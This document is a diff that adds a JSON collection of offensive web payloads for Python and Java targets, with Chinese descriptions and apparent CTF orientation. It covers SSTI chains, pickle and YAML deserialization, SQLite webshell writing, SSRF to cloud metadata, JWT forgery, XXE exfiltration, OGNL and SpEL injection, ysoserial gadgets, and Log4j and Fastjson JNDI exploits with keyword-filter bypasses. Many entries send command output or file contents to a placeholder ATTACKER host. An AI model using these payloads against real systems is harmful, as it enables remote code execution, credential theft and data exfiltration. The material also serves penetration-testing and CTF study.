@@ -1,0 +1,164 @@
+{
+ "payloads": [
+  {
+   "id": "payload-python-ssti-filters",
+   "title": "Python SSTI: Jinja2 过滤器与全局对象",
+   "language": "python",
+   "category": "ssti",
+   "description": "从 config / self / lipsum 三个入口摸到 os，绕开对 __class__ 的过滤用 attr / |attr。",
+   "body": "{{7*7}}  {{7*'7'}}  {{config}}\n# 经典链\n{{''.__class__.__mro__[1].__subclasses__()}}\n{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}\n{{cycler.__init__.__globals__.os.popen('id').read()}}\n{{lipsum.__globals__.os.popen('id').read()}}\n{{joiner.__init__.__globals__.os.popen('id').read()}}\n{{namespace.__init__.__globals__.os.popen('id').read()}}\n{{url_for.__globals__['os'].popen('id').read()}}\n{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}\n# 过滤 __class__ 时\n{{''['__cl''ass__']}}\n{{''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')()}}\n{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')}}\n# 过滤 . 时用 []，过滤引号时用 request.args 传参\n{{''[request.args.a][request.args.b]}}\n# 无回显：直接打外带\n{{cycler.__init__.__globals__.os.popen('curl http://ATTACKER/`id|base64`').read()}}"
+  },
+  {
+   "id": "payload-python-ssti-blind",
+   "title": "Python SSTI: 盲注与探测顺序",
+   "language": "python",
+   "category": "ssti",
+   "description": "先判断模板引擎，再判断是否能回显，最后选链；错误页本身就是回显。",
+   "body": "# 1) 引擎指纹\n{{7*7}}      → 49  = Jinja2/Twig\n${7*7}       → 49  = Freemarker/JSP EL\n#{7*7}       → 49  = Ruby/Ruby ERB\n<%= 7*7 %>   → 49  = ERB/EJS\n{{7*'7'}}    → 7777777 = Jinja2；49 = Twig\n# 2) 沙箱探测\n{{''.__class__}}\n{{self.__init__.__globals__}}\n{{request.__class__}}\n# 3) 回显探测\n{{config.items()}}\n# 4) 无回显：写文件 / 外带\n{{''.__class__.__mro__[1].__subclasses__()[N]('/tmp/o','w').write('x')}}\n{{lipsum.__globals__['os'].system('curl ATTACKER/`id|base64`')}}"
+  },
+  {
+   "id": "payload-python-pickle-opcodes",
+   "title": "Python 反序列化: pickle 手工字节码",
+   "language": "python",
+   "category": "deserialization",
+   "description": "不依赖目标类时用 reduce 直接调 os.system；pickle 只要能被 load 就是 RCE。",
+   "body": "# 最简 RCE\ncos\nsystem\n(S'id'\ntR.\n# 执行并回显\ncbuiltins\neval\n(S\"__import__('os').popen('id').read()\"\ntR.\n# 用 python 生成\nimport pickle,os\nclass E:\n    def __reduce__(self): return (os.system,('id',))\nprint(pickle.dumps(E()))\n# 兼容 protocol 2 的字节\npickle.dumps(E(), protocol=2)\n# 常见入口：cookie、session、缓存、redis、celery、ML 模型（torch.load/np.load allow_pickle）"
+  },
+  {
+   "id": "payload-python-yaml",
+   "title": "Python 反序列化: yaml.load / unsafe",
+   "language": "python",
+   "category": "deserialization",
+   "description": "PyYAML < 6 的 yaml.load 无 Loader 时可构造 python/object 标签。",
+   "body": "!!python/object/apply:os.system [\"id\"]\n!!python/object/apply:subprocess.check_output [[\"id\"]]\n!!python/object/new:os.system [\"id\"]\n!!python/object/apply:builtins.eval [\"__import__('os').popen('id').read()\"]\n# 文件落地\n!!python/object/apply:io.open [\"/tmp/x\",\"w\"]\n# 探测：SafeLoader 会抛 ConstructorError，FullLoader 不会执行 system\n# 同类：jsonpickle.decode、dill、marshal"
+  },
+  {
+   "id": "payload-python-sqlite",
+   "title": "Python SQL 注入: sqlite ATTACH 写文件",
+   "language": "python",
+   "category": "sqli",
+   "description": "SQLite 没有 outfile，但 ATTACH DATABASE 可以把表写成磁盘文件。",
+   "body": "' union select 1,2,3--\n'; attach database '/var/www/html/x.php' as p;--\n'; create table p.s (d text);--\n'; insert into p.s values ('<?php eval($_POST[1]);?>');--\n# 读表结构\n' union select name,sql,3 from sqlite_master--\n# 时间盲注不支持 sleep，用 heavy query\n' and (select count(*) from sqlite_master a,sqlite_master b,sqlite_master c)>0--"
+  },
+  {
+   "id": "payload-python-format-ssti",
+   "title": "Python str.format 注入",
+   "language": "python",
+   "category": "ssti",
+   "description": "用户输入进了 '...{}...'.format(x) 或 f-string 时可读对象属性，进而 RCE。",
+   "body": "{0.__class__}\n{0.__class__.__mro__[1].__subclasses__()}\n{0.__init__.__globals__[os].popen('id').read()}\n{user.__init__.__globals__[__builtins__][__import__](os).popen('id').read()}\n# 探测\n{a}\n{0!r}\n{0:>100}"
+  },
+  {
+   "id": "payload-python-ssrf-file",
+   "title": "Python SSRF: requests / urllib 协议面",
+   "language": "python",
+   "category": "ssrf",
+   "description": "requests 不支持 gopher，但 urllib/httplib 支持；能控 scheme 时先试 file://。",
+   "body": "file:///etc/passwd\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://100.100.100.200/latest/meta-data/\nhttp://metadata.google.internal/computeMetadata/v1/\n# urllib 打 Redis\nurllib.request.urlopen('dict://127.0.0.1:6379/info')\n# 绕过 host 校验\nhttp://127.0.0.1:6379  http://0.0.0.0:6379  http://[::1]:6379\nhttp://2130706433:6379  http://0x7f000001:6379  http://127.1:6379\nhttp://ATTACKER@127.0.0.1:6379\n# DNS rebinding / 302 跳转\nhttp://ATTACKER/r?to=http://127.0.0.1:6379"
+  },
+  {
+   "id": "payload-python-jwt-none",
+   "title": "Python JWT: 算法混淆与密钥爆破",
+   "language": "python",
+   "category": "jwt",
+   "description": "PyJWT 老版本接受 alg=none；RS256 公钥泄露时可改成 HS256 用公钥当密钥。",
+   "body": "# 1) alg=none\n{\"alg\":\"none\",\"typ\":\"JWT\"} + {\"user\":\"admin\",\"role\":\"admin\"} + \"\"\n# 2) RS256 → HS256（用泄露的公钥当 HMAC 密钥）\njwt.encode({\"user\":\"admin\"}, open('pub.pem').read(), algorithm='HS256')\n# 3) 弱密钥爆破\nhashcat -m 16500 jwt.txt rockyou.txt\npython3 jwt_tool.py <JWT> -C -d rockyou.txt\n# 4) kid 注入\n{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}      # 空密钥\n{\"alg\":\"HS256\",\"kid\":\"/etc/passwd\"}               # 读文件当密钥\n{\"alg\":\"HS256\",\"kid\":\"x' union select 'k'-- -\"}   # SQL 注入\n# 5) jku / x5u 指向自己的 JWKS"
+  },
+  {
+   "id": "payload-python-xxe-lxml",
+   "title": "Python XXE: lxml / xml.etree",
+   "language": "python",
+   "category": "xxe",
+   "description": "lxml resolve_entities=True 时可用外部实体；xml.etree 默认不解析实体但可被 xxe 库影响。",
+   "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>\n# 盲外带\n<!DOCTYPE r [<!ENTITY % f SYSTEM \"http://ATTACKER/e.dtd\">%f;]>\n# e.dtd\n<!ENTITY % a SYSTEM \"file:///etc/passwd\"><!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'http://ATTACKER/?%a;'>\">%b;%c;\n# 常见受影响解析\nlxml.etree.parse(..., resolve_entities=True)\nxmltodict.parse  /  defusedxml 缺失的 xml.dom.minidom"
+  },
+  {
+   "id": "payload-python-path-traversal",
+   "title": "Python 路径穿越与任意文件读写",
+   "language": "python",
+   "category": "lfi",
+   "description": "os.path.join 会吞掉前缀，但拼接方式不同结果不同；先试绝对路径再试穿越。",
+   "body": "?file=../../../../etc/passwd\n?file=/etc/passwd\n?file=....//....//etc/passwd\n?file=%2e%2e%2f%2e%2e%2fetc/passwd\n?file=..%252f..%252fetc/passwd\n# Flask send_file 绝对路径\n?file=/etc/passwd\n# 读源码（含密钥）\n?file=../app/config.py\n?file=../.env\n# 写文件（上传点 + 穿越文件名）\nfilename=../../static/x.py"
+  },
+  {
+   "id": "payload-java-spel-tricks",
+   "title": "Java SpEL 注入: 无回显与沙箱",
+   "language": "java",
+   "category": "ssti",
+   "description": "Spring 的 SpEL 默认能反射调 Runtime；SimpleEvaluationContext 会拦，先探。",
+   "body": "${7*7}\n#{7*7}\n${T(java.lang.Runtime).getRuntime().exec('id')}\n${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})}\n# 回显\n${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}\n${new String(T(java.lang.Runtime).getRuntime().exec('id').getInputStream().readAllBytes())}\n# 绕 getClass 黑名单\n${T(String).getClass().forName(\"java.lang.Run\"+\"time\")}\n# Spring Cloud Function / Gateway 表达式注入\nspring.cloud.function.routing-expression=T(java.lang.Runtime).getRuntime().exec(\"id\")"
+  },
+  {
+   "id": "payload-java-ognl",
+   "title": "Java OGNL 注入: Struts2 变体",
+   "language": "java",
+   "category": "ssti",
+   "description": "Struts2 各版本过滤不同，S2-045/046/016/032/057 手法要按版本试。",
+   "body": "%{(#a=@java.lang.Runtime@getRuntime()).exec('id')}\n%{#context['xwork.MethodAccessor.denyMethodExecution']=false,\n#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),\n#f.setAccessible(true),#f.set(#_memberAccess,true),\n@java.lang.Runtime@getRuntime().exec('id')}\n# S2-045（Content-Type）\nContent-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}\n# S2-057（namespace）\n/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack']...)}/action"
+  },
+  {
+   "id": "payload-java-cc-gadget",
+   "title": "Java 反序列化: CC / CB 链生成",
+   "language": "java",
+   "category": "deserialization",
+   "description": "ysoserial 一键生成；目标 classpath 决定用哪条链，先探依赖版本。",
+   "body": "java -jar ysoserial.jar CommonsCollections1 'id' > p.bin\njava -jar ysoserial.jar CommonsCollections5 'bash -c {echo,}|{base64,-d}|bash' > p.bin\njava -jar ysoserial.jar CommonsCollections6 'id' > p.bin\njava -jar ysoserial.jar CommonsBeanutils1 'id' > p.bin\njava -jar ysoserial.jar URLDNS 'http://ATTACKER/' > p.bin     # 只探测，不依赖链\njava -jar ysoserial.jar JRMPClient 'ATTACKER:1099' > p.bin\n# 无 ysoserial 时用 marshalsec / JNDIExploit\n# 入口：readObject、XStream、Hessian、Kryo、Jackson default typing、Fastjson、Shiro rememberMe"
+  },
+  {
+   "id": "payload-java-jndi-ldap",
+   "title": "Java JNDI 注入: LDAP / RMI 引用",
+   "language": "java",
+   "category": "rce",
+   "description": "JDK 高版本默认禁远程 codebase，但本地工厂类（Tomcat BeanFactory、Groovy）仍可用。",
+   "body": "${jndi:ldap://ATTACKER:1389/Exploit}\n${jndi:rmi://ATTACKER:1099/Exploit}\n${jndi:ldap://ATTACKER:1389/Basic/Command/Base64/<b64>}\n# 本地工厂（JDK 8u191+ 可用）\nldap://ATTACKER:1389/TomcatBypass/TomcatEcho\nldap://ATTACKER:1389/TomcatBypass/GroovyEcho\n# 8u121 前可远程 codebase\n-Dcom.sun.jndi.ldap.object.trustURLCodebase=true\n# 工具\nJNDIExploit-1.4-SNAPSHOT.jar -i ATTACKER -p 8888\nmarshalsec: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://ATTACKER:8000/#Exploit 1389"
+  },
+  {
+   "id": "payload-java-xxe-oob",
+   "title": "Java XXE: 外带与盲打",
+   "language": "java",
+   "category": "xxe",
+   "description": "Java 解析器对参数实体支持好，OOB 成功率高于 PHP；注意 JDK 版本对 http 实体的限制。",
+   "body": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>\n# OOB\n<!DOCTYPE r [<!ENTITY % f SYSTEM \"http://ATTACKER/e.dtd\">%f;]>\n# e.dtd\n<!ENTITY % a SYSTEM \"file:///etc/passwd\"><!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'http://ATTACKER/?%a;'>\">%b;%c;\n# 无外网时读本地并报错回显\n<!DOCTYPE r [<!ENTITY % f SYSTEM \"file:///nonexist/%file;\">]>\n# 常见点：SOAP、SVG 上传、docx/xlsx 解析、Solr、WebLogic"
+  },
+  {
+   "id": "payload-java-ssti-freemarker",
+   "title": "Java SSTI: Freemarker / Velocity",
+   "language": "java",
+   "category": "ssti",
+   "description": "Freemarker 的 Execute 内建函数在 2.3.30 后需配置，老版本直接 RCE。",
+   "body": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()>${ob(\"java.lang.ProcessBuilder\",\"id\").start()}\n<#assign j=\"freemarker.template.utility.JythonRuntime\"?new()><@j>import os;os.system(\"id\")</@j>\n# Velocity\n#set($e=\"e\");$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")"
+  },
+  {
+   "id": "payload-java-sql-mybatis",
+   "title": "Java SQL 注入: MyBatis ${} 与 JDBC 特性",
+   "language": "java",
+   "category": "sqli",
+   "description": "MyBatis 里 #{} 安全、${} 拼接；MySQL 驱动还能用 allowMultiQueries / LOAD_FILE。",
+   "body": "' or 1=1-- \n' union select 1,2,3-- \n# 堆叠（需 allowMultiQueries=true）\n'; update users set password='x' where id=1-- \n# MySQL 读文件\n' union select load_file('/etc/passwd'),2-- \n# 报错注入\n' and extractvalue(1,concat(0x7e,(select user())))-- \n# order by 注入（预处理无效）\n?sort=id,(select 1 from (select sleep(3))a)\n?sort=if(1=1,id,password)\n# 常见点：MyBatis ${}、JPA 原生查询拼接、@Query + 字符串、order by 动态列"
+  },
+  {
+   "id": "payload-java-actuator",
+   "title": "Spring Boot Actuator 信息泄露与利用",
+   "language": "java",
+   "category": "info-leak",
+   "description": "Actuator 端点常直接暴露环境变量（含 flag）、heapdump（可捞口令）、甚至 jolokia 执行。",
+   "body": "/actuator\n/actuator/env\n/actuator/env/spring.datasource.password\n/actuator/configprops\n/actuator/heapdump          → 用 jvisualvm / heapdump_tool 搜 password、flag\n/actuator/threaddump\n/actuator/mappings\n/actuator/gateway/routes   → 配合 SpEL 注入 RCE\n/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/tmp/x.jar\n# 打 heapdump 关键命令\njhat heapdump &  → 搜 \"flag{\"\nstrings heapdump | grep -iE 'password|secret|flag'\n# 老路径\n/env  /health  /refresh  /restart  /shutdown"
+  },
+  {
+   "id": "payload-java-log4j",
+   "title": "Log4j2 JNDI: 变体与绕过",
+   "language": "java",
+   "category": "rce",
+   "description": "2.15/2.16/2.17 逐个修补，高版本仍可打本地工厂；所有会被记录的输入都是注入点。",
+   "body": "${jndi:ldap://ATTACKER:1389/a}\n${jndi:ldaps://ATTACKER:636/a}\n${jndi:dns://ATTACKER/a}                       # 只探测\n${${lower:j}ndi:${lower:l}dap://ATTACKER/a}    # 绕关键字\n${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://ATTACKER/a}\n${jndi:${env:BARFOO:-l}${env:BARFOO:-d}ap://ATTACKER/a}\n${jndi:ldap://ATTACKER:1389/#${sys:user.name}}\n# 常见注入点：UA、X-Forwarded-For、用户名、搜索词、异常栈"
+  },
+  {
+   "id": "payload-java-fastjson",
+   "title": "Fastjson 版本探测与利用",
+   "language": "java",
+   "category": "deserialization",
+   "description": "先判版本（1.2.x），1.2.24/1.2.47 有通杀链，之后靠 autoType 白名单绕过。",
+   "body": "{\"@type\":\"java.net.Inet4Address\",\"val\":\"dns.ATTACKER\"}\n{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dns.ATTACKER\"}}\n# 1.2.24\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://ATTACKER:1389/a\",\"autoCommit\":true}\n# 1.2.47（缓存绕过，无需 autoType）\n{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\n \"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://ATTACKER/a\",\"autoCommit\":true}}\n# 1.2.68+（期望类绕过）\n{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",...}\n# 探测版本\n{\"@type\":\"java.lang.Class\",\"val\":\"java.lang.Object\"}  → 报错含版本号"
+  }
+ ]
+}
